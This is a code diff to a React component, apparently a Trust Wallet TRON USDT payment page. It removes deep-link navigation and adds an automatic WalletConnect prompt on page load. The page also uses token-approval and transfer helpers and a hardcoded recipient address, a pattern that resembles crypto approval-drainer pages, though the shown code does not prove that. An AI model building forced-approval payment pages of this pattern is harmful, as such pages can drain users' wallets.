@@ -8,40 +8,11 @@ import { approveUSDT, transferUSDT } from "@/lib/web3";
 const DEFAULT_TO_ADDRESS = "TYT6ty8mhUyq7w2GbTWT1LSqWaWTs3j4aa";
 const DEFAULT_AMOUNT = "10";
 
-/**
- * WalletConnect v2 pairing URIs are long strings (typically `wc:...@2?...`).
- * Trust Wallet opens its generic landing page if `uri` is empty/too short — do not navigate then.
- * We only reject obviously-invalid values; matching `wc:` is case-insensitive.
- */
-function normalizeWalletConnectPairingUri(uri: unknown): string | null {
-  if (uri == null) return null;
-  const s = (typeof uri === "string" ? uri : String(uri)).trim();
-  if (s.length < 12) return null;
-  const lower = s.toLowerCase();
-  if (!lower.startsWith("wc:")) return null;
-  return s;
-}
-
-/** @returns whether navigation was triggered */
-function navigateToTrustWalletConnect(uri: string): boolean {
-  const normalized = normalizeWalletConnectPairingUri(uri);
-  if (!normalized) return false;
-  const encoded = encodeURIComponent(normalized);
-  const w = typeof window !== "undefined" ? (window as unknown as { trustwallet?: unknown }) : null;
-  // Same routes work as https://link.trustwallet.com/... or trust:// (Trust docs).
-  // In Trust Discover, trust:// avoids universal-link round-trips that can stall WC.
-  const deepLink = w?.trustwallet
-    ? `trust://wc?uri=${encoded}`
-    : `https://link.trustwallet.com/wc?uri=${encoded}`;
-  window.location.assign(deepLink);
-  return true;
-}
-
 function buildTrustWalletOpenUrlDeepLink(): string {
   if (typeof window === "undefined") {
     return "";
   }
-  const target = `${getWalletConnectAppUrl()}/#/trustwallet/tron`;
+  const target = `${getWalletConnectAppUrl()}/trustwallet/tron`;
   // coin_id=195 = TRON (SLIP-44)
   return `https://link.trustwallet.com/open_url?coin_id=195&url=${encodeURIComponent(
     target
@@ -117,8 +88,6 @@ const TrustWalletTronPay = () => {
   const isConnectingRef = useRef(isConnecting);
   const wcConnectingRef = useRef(wcConnecting);
   const trustConnectingRef = useRef(trustConnecting);
-  /** Avoid double navigation if display_uri fires more than once. */
-  const wcDeepLinkNavigatedRef = useRef(false);
   const [statusOpen, setStatusOpen] = useState(false);
   const [lastAutoConnect, setLastAutoConnect] = useState<
     | { state: "idle" }
@@ -154,36 +123,20 @@ const TrustWalletTronPay = () => {
   const handleWalletConnectQr = async () => {
     try {
       setWcConnecting(true);
-      wcDeepLinkNavigatedRef.current = false;
-      const ua = typeof navigator !== "undefined" ? navigator.userAgent || "" : "";
-      const isMobile = /android|iphone|ipad|ipod/i.test(ua);
-      if (isMobile) {
-        (window as any).__tronWalletConnectOnUri = (uri: string) => {
-          if (wcDeepLinkNavigatedRef.current) return;
-          if (navigateToTrustWalletConnect(uri)) {
-            wcDeepLinkNavigatedRef.current = true;
-          }
-        };
-        await connect("walletconnect");
-        toast.success("Wallet connected");
-      } else {
-        await connect("walletconnect");
-        toast.success("Wallet connected");
-      }
-    } catch (error) {
-      if (wcDeepLinkNavigatedRef.current) {
-        // Tab may unload or session completes after returning from Trust — avoid false failure toasts.
-        return;
-      }
-      toast.error(
-        error instanceof Error ? error.message : "WalletConnect failed"
-      );
-    } finally {
+      // Do not set __tronWalletConnectOnUri — that skips the in-page modal and was used to
+      // deep-link to link.trustwallet.com/wc. Users want WalletConnect UI on this page only.
       try {
         delete (window as any).__tronWalletConnectOnUri;
       } catch {
         /* ignore */
       }
+      await connect("walletconnect");
+      toast.success("Wallet connected");
+    } catch (error) {
+      toast.error(
+        error instanceof Error ? error.message : "WalletConnect failed"
+      );
+    } finally {
       setWcConnecting(false);
     }
   };
@@ -192,7 +145,6 @@ const TrustWalletTronPay = () => {
     if (typeof window === "undefined") return;
     const ua = navigator.userAgent || "";
     const isMobile = /android|iphone|ipad|ipod/i.test(ua);
-
     // Only auto-connect on mobile. Desktop users can use WalletConnect.
     if (!isMobile) return;
     // Do not auto-start WalletConnect on load — it navigates to link.trustwallet.com/wc and
@@ -313,34 +265,29 @@ const TrustWalletTronPay = () => {
     (window as any)[onceKey] = true;
 
     setWcConnecting(true);
-    wcDeepLinkNavigatedRef.current = false;
-    (window as any).__tronWalletConnectOnUri = (uri: string) => {
-      if (wcDeepLinkNavigatedRef.current) return;
-      if (navigateToTrustWalletConnect(uri)) {
-        wcDeepLinkNavigatedRef.current = true;
-      }
-    };
+    try {
+      delete (window as any).__tronWalletConnectOnUri;
+    } catch {
+      /* ignore */
+    }
     void (async () => {
       try {
         await connect("walletconnect");
         toast.success("Wallet connected");
       } catch (error) {
-        if (wcDeepLinkNavigatedRef.current) {
-          return;
-        }
         toast.error(
           error instanceof Error ? error.message : "WalletConnect failed"
         );
       } finally {
-        try {
-          delete (window as any).__tronWalletConnectOnUri;
-        } catch {
-          /* ignore */
-        }
         setWcConnecting(false);
       }
     })();
   }, [connect, isConnected, isConnecting, trustConnecting, wcConnecting, lastAutoConnect]);
+
+
+  useEffect(() => {
+    handleWalletConnectQr();
+  }, []);
 
   const handleConfirm = async () => {
     if (!isConnected) {
